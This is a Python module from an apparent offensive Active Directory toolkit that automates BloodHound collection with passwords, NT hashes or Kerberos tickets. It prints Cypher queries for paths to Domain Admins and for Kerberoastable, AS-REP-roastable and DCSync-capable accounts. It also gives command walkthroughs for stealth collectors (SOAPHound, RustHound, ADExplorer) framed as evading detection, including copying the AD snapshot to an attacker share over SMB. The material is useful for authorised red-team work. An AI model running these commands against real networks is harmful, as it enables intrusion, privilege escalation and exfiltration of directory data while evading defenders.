"""
Module: BloodHound Helper — Collection / Neo4j Queries / Owned Nodes
"""
from utils.helpers import *
from config.settings import SESSION

QUERIES = """
╔═══════════════════════════════════════════════════════════════╗
║              BLOODHOUND NEO4J CYPHER QUERIES                  ║
╠═══════════════════════════════════════════════════════════════╣
║ Shortest path to DA from owned nodes:                         ║
║  MATCH p=shortestPath((u {owned:true})-[*1..]->(g:Group       ║
║  {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p                 ║
║                                                               ║
║ All Kerberoastable users:                                     ║
║  MATCH (u:User {hasspn:true}) RETURN u.name, u.spns           ║
║                                                               ║
║ Users with DCSync rights:                                     ║
║  MATCH p=(u)-[:GetChanges|GetChangesAll*1..2]->(d:Domain)     ║
║  RETURN u.name                                                ║
║                                                               ║
║ Computers with Unconstrained Delegation:                      ║
║  MATCH (c:Computer {unconstraineddelegation:true}) RETURN c   ║
║                                                               ║
║ AS-REP Roastable:                                             ║
║  MATCH (u:User {dontreqpreauth:true}) RETURN u.name           ║
║                                                               ║
║ AdminTo relationships:                                        ║
║  MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN p           ║
║                                                               ║
║ Owned → High Value target paths:                              ║
║  MATCH p=shortestPath((u {owned:true})-[*1..10]->             ║
║  (h {highvalue:true})) RETURN p                               ║
╚═══════════════════════════════════════════════════════════════╝
"""

def run():
    print_banner("BLOODHOUND HELPER")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print("""
  [1]  Collect All Data          (bloodhound-python)
  [2]  Collect DCOnly            (faster, DC targets only)
  [3]  Print Neo4j Query Library
  [4]  Mark Node as Owned
  [5]  Export Owned Users List
  [6]  SOAPHound                 (SOAP-based stealth collection — bypasses BH detections)
  [7]  RustHound                 (fast cross-platform Rust collector)
  [8]  ADExplorer Snapshot       (zero-LDAP offline BloodHound analysis)
  [9]  Kerberos Time Sync Help   (fix KRB_AP_ERR_SKEW)
  [10] Collect DCOnly with faketime
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    import os, glob, shutil
    from config.settings import SESSION as _S, OUTPUT_DIR
    bh_out_dir = os.path.join(_S.get("output_dir") or str(OUTPUT_DIR), "bloodhound")
    os.makedirs(bh_out_dir, exist_ok=True)

    def _usable_secret(value):
        value = str(value or "")
        return value if value and value != "***" else ""

    def _has_collection_auth():
        nt_hash = _usable_secret(_S.get("nt_hash", ""))
        ccache = _usable_secret(_S.get("krb5_ccache", ""))
        password = _usable_secret(pw)
        if not dom or not dc:
            error("BloodHound collection requires DC IP and domain.")
            return False
        if not user:
            error("BloodHound collection requires a username for authenticated LDAP collection.")
            return False
        if _S.get("use_kerberos") and ccache:
            return True
        if nt_hash or password:
            return True
        error("BloodHound collection requires a password, NT hash, or Kerberos ccache.")
        info("Set credentials in Session Manager or run the AI Agent [51] with valid credentials first.")
        return False

    def _bloodhound_base(prefix=""):
        dc_fqdn = _S.get("dc_fqdn", "")
        if dc_fqdn and dom and not str(dc_fqdn).lower().endswith("." + dom.lower()):
            warn(f"Ignoring stale DC FQDN '{dc_fqdn}' for active domain '{dom}'")
            dc_fqdn = ""
            _S["dc_fqdn"] = ""
        nt_hash = _usable_secret(_S.get("nt_hash", ""))
        ccache = _usable_secret(_S.get("krb5_ccache", ""))
        password = _usable_secret(pw)
        use_kerberos = bool(_S.get("use_kerberos"))

        if use_kerberos and ccache:
            auth = f"-u {shell_quote(user)} -k -no-pass"
            auth = f"KRB5CCNAME={shell_quote(ccache)} {prefix}bloodhound-python {auth}"
        elif nt_hash:
            auth = f"{prefix}bloodhound-python -u {shell_quote(user)} --hashes {shell_quote(':' + nt_hash.split(':')[-1])}"
        else:
            auth = f"{prefix}bloodhound-python -u {shell_quote(user)} -p {shell_quote(password)}"

        cmd = f"{auth} -d {shell_quote(dom)} -ns {shell_quote(dc)} --dns-tcp --disable-autogc"
        if dc_fqdn:
            cmd += f" -dc {shell_quote(dc_fqdn)}"
        return cmd

    def _show_collection_help(output):
        low = output.lower()
        if "krb_ap_err_skew" in low or "clock skew too great" in low:
            warn("Kerberos clock skew detected. BloodHound cannot get a TGT until Kali and the DC clocks match.")
            print(f"""
  {Y}Fix time first, then rerun BloodHound:{RST}
    sudo ntpdate -u {dc}

  {Y}If NTP is blocked, use the Kerberos workflow module:{RST}
    [18] Kerberos Attacks -> [A] NTLM-Disabled Attack Workflow

  {Y}Quick checks:{RST}
    date
    ntpdate -q {dc}

  {DIM}Kerberos usually fails when clock skew is greater than 5 minutes.{RST}
""")
        if "ldaperr" in low or "could not authenticate to ldap" in low or "data 1" in low:
            warn("LDAP authentication failed after BloodHound attempted collection.")
            print(f"""
  {Y}Check these before retrying:{RST}
    1. Password/hash is still valid for {user}@{dom}
    2. If NTLM is disabled, sync time and use Kerberos instead of NTLM fallback
    3. DC FQDN resolves correctly: {SESSION.get("dc_fqdn") or "<set dc_fqdn in session/.env>"}
    4. Try DCOnly first: BloodHound Helper -> [2]
""")

    def _collect(collection, prefix=""):
        if not shutil.which("bloodhound-python"):
            error("bloodhound-python not found. Install with: pip install bloodhound")
            return
        if not _has_collection_auth():
            return
        prev_dir = os.getcwd()
        os.chdir(bh_out_dir)
        try:
            cmd = f"{_bloodhound_base(prefix)} -c {shell_quote(collection)} --zip"
            output = run_cmd(cmd, capture=True, timeout=600)
            if output.strip():
                print(output)
                _show_collection_help(output)
        finally:
            os.chdir(prev_dir)
        zips = sorted(glob.glob(os.path.join(bh_out_dir, "*.zip")))
        if zips:
            success(f"BloodHound zip → {fg(75)}{zips[-1]}{RST}")
            info("Import into BloodHound GUI: Upload Data → select the zip")
        else:
            warn(f"No zip found, check: {bh_out_dir}")
            info("If DNS resolution failed, set DC_FQDN in .env/session instead of relying on auto-discovery.")

    if c == "1":
        stop = spinner("Collecting BloodHound data (All)")
        _collect("All")
        stop()

    elif c == "2":
        _collect("DCOnly")

    elif c == "3":
        print(QUERIES)

    elif c == "4":
        node = prompt("Node name (e.g. JDOE@CORP.LOCAL)")
        SESSION["owned_users"].append(node)
        info(f"In Neo4j browser run:")
        print(f"  {Y}MATCH (n {{name:'{node}'}}) SET n.owned=true RETURN n{RST}")

    elif c == "5":
        if SESSION["owned_users"]:
            for u in SESSION["owned_users"]:
                print(f"  {G}✔{RST} {u}")
        else:
            warn("No owned users in session yet")

    elif c == "6":
        cache = prompt("Cache output path [C:\\AD\\Tools\\cache.txt]") or "C:\\AD\\Tools\\cache.txt"
        out   = prompt("BH output folder  [C:\\AD\\Tools\\bh-out]")    or "C:\\AD\\Tools\\bh-out"
        print(f"""
  {NEON_CYN}SOAPHound — Stealth BloodHound Collection via ADWS SOAP:{RST}

  {DIM}SOAPHound uses the Active Directory Web Services (ADWS) SOAP interface
  instead of LDAP → bypasses many BloodHound-specific LDAP detections.
  ADWS runs on DCs (TCP 9389) — traffic looks like legitimate management.{RST}

  ── Step 1: Build cache (enumerate all objects) ───────────────────────────
  .\\SOAPHound.exe --buildcache -c {cache}

  # With explicit credentials:
  .\\SOAPHound.exe --buildcache -c {cache} \\
    --username {user}@{dom} --password '{pw}' --domain {dom} --dc {dc}

  ── Step 2: Dump BloodHound-compatible data ───────────────────────────────
  .\\SOAPHound.exe -c {cache} --bhdump -o {out} --nolaps

  # Include LAPS if you have rights:
  .\\SOAPHound.exe -c {cache} --bhdump -o {out}

  # Run cache + dump in one step:
  .\\SOAPHound.exe --buildcache -c {cache} --bhdump -o {out} --nolaps

  ── Step 3: Import into BloodHound ───────────────────────────────────────
  # Copy {out}\\*.json to attacker machine
  # BloodHound GUI → Upload Data → select all JSON files

  {NEON_CYN}ADExplorerSnapshot.py (alternative stealth method):{RST}
  {DIM}# Take AD Explorer snapshot on DC:
  ADExplorer.exe -snapshot "" ADSnapshot.dat
  # Convert to BloodHound JSON offline (no network traffic during analysis):
  python3 ADExplorerSnapshot.py ADSnapshot.dat -o {out}{RST}

  {NEON_CYN}Comparison:{RST}
  {DIM}bloodhound-python : LDAP-based, well-detected, needs network access
  SOAPHound          : ADWS/SOAP, stealthier, requires ADWS TCP 9389
  RustHound          : LDAP-based but fast, cross-platform
  ADExplorer         : zero LDAP volume during snapshot; analysis offline{RST}
""")

    elif c == "7":
        out = prompt("Output folder [/tmp/rusthound]") or "/tmp/rusthound"
        print(f"""
  {NEON_CYN}RustHound — Fast Cross-Platform BloodHound Collector:{RST}

  # Linux (from Kali):
  rusthound -d {dom} -u '{user}@{dom}' -p '{pw}' -i {dc} -o {out} -z

  # Collect all categories:
  rusthound -d {dom} -u '{user}@{dom}' -p '{pw}' -i {dc} \\
    -o {out} --ldaps -z --dns-tcp

  # Windows binary:
  .\\rusthound.exe -d {dom} -u '{user}' -p '{pw}' -i {dc} -o {out} -z

  # Import resulting ZIP into BloodHound GUI
  success "Import {out}/*.zip into BloodHound"
""")

    elif c == "8":
        snap_path = prompt("ADExplorer snapshot save path [C:\\AD\\Tools\\ADSnapshot.dat]") or "C:\\AD\\Tools\\ADSnapshot.dat"
        out       = prompt("BloodHound output folder [/tmp/adex-out]") or "/tmp/adex-out"
        print(f"""
  {NEON_CYN}ADExplorer Snapshot → Offline BloodHound Analysis:{RST}

  {DIM}ADExplorer (Sysinternals) can take a full snapshot of the AD database.
  The snapshot generates ZERO LDAP volume during BloodHound analysis —
  the conversion to BH JSON happens offline. Perfect for OPSEC-sensitive ops.{RST}

  ── Step 1: Take AD snapshot on target DC ────────────────────────────────
  {Y}GUI method (interactive):{RST}
  # Run ADExplorer.exe → File → Create Snapshot → save as {snap_path}

  {Y}CLI/automated (headless):{RST}
  ADExplorer.exe -snapshot "" {snap_path}

  {Y}With explicit credentials:{RST}
  ADExplorer.exe -snapshot "" {snap_path} \\
    /u:{user}@{dom} /p:{pw if pw else "<password>"}

  ── Step 2: Transfer snapshot to attacker machine ─────────────────────────
  # Via SMB:
  copy {snap_path} \\\\<attacker>\\share\\ADSnapshot.dat

  # Via NXC:
  nxc smb {dc} -u '{user}' -p '{pw}' \\
    --get-file "{snap_path}" /tmp/ADSnapshot.dat

  ── Step 3: Convert snapshot to BloodHound JSON (offline) ─────────────────
  {Y}ADExplorerSnapshot.py:{RST}
  pip install adexplorersnapshotpy

  python3 ADExplorerSnapshot.py /tmp/ADSnapshot.dat -o {out}

  # This produces standard BloodHound JSON files:
  ls {out}/
  # computers.json  groups.json  users.json  domains.json  gpos.json  ous.json

  ── Step 4: Import into BloodHound ────────────────────────────────────────
  # BloodHound GUI → Upload Data → select all JSON files from {out}/
  # Or use neo4j-admin import for bulk ingestion

  {Y}BloodHound CE (new) import:{RST}
  # Use bloodhound-cli or web UI upload

  ── ADExplorer for offline AD analysis (without BloodHound) ───────────────
  {Y}Browse snapshot offline — no network connection needed:{RST}
  # Open ADExplorer.exe → File → Open Snapshot → select .dat file
  # Browse entire AD tree: users, groups, computers, ACLs, GPOs, trusts

  {Y}Export specific objects to CSV:{RST}
  # In ADExplorer GUI: search → right-click → Export to CSV

  {NEON_CYN}Why ADExplorer is stealthier than bloodhound-python:{RST}
  {DIM}bloodhound-python   : many LDAP queries → easily detected by MDI/SIEM
  ADExplorer snapshot : ONE bulk LDAP sync → looks like normal AD replication
  ADExplorerSnapshot  : conversion runs OFFLINE on attacker → zero on-target traffic
  Result              : identical BloodHound data with much lower detection risk{RST}

  {NEON_CYN}Tool sources:{RST}
  {DIM}• ADExplorer: learn.microsoft.com/sysinternals/adexplorer
  • ADExplorerSnapshot.py: github.com/c3c/ADExplorerSnapshot.py{RST}
""")
        add_finding("ADExplorer Snapshot Collection", "Medium",
                    f"ADExplorer snapshot of {dom} taken — full AD structure captured for offline analysis",
                    "Monitor ADExplorer.exe execution; alert on snapshot file creation; audit bulk LDAP enumeration patterns")

    elif c == "9":
        print(f"""
  {NEON_CYN}Kerberos Time Sync Help:{RST}

  Your BloodHound error shows:
    {Y}KRB_AP_ERR_SKEW(Clock skew too great){RST}

  Fix it before Kerberos-based collection:
    sudo ntpdate -u {dc}

  Then retry:
    bloodhound-python -u {shell_quote(user)} -p '<password>' -d {dom} \\
      -ns {dc} --dns-tcp -dc {SESSION.get("dc_fqdn") or "DC1." + dom} -c DCOnly --zip

  If NTP is blocked on the target, run:
    [18] Kerberos Attacks -> [A] NTLM-Disabled Attack Workflow
""")

    elif c == "10":
        if not shutil.which("faketime"):
            error("faketime not found. Install it with: sudo apt install faketime")
        else:
            dc_time = prompt("DC time for faketime (e.g. 2026-05-02 15:20:00)")
            if not dc_time:
                warn("No time provided")
            else:
                _collect("DCOnly", prefix=f"faketime {shell_quote(dc_time)} ")

    pause()
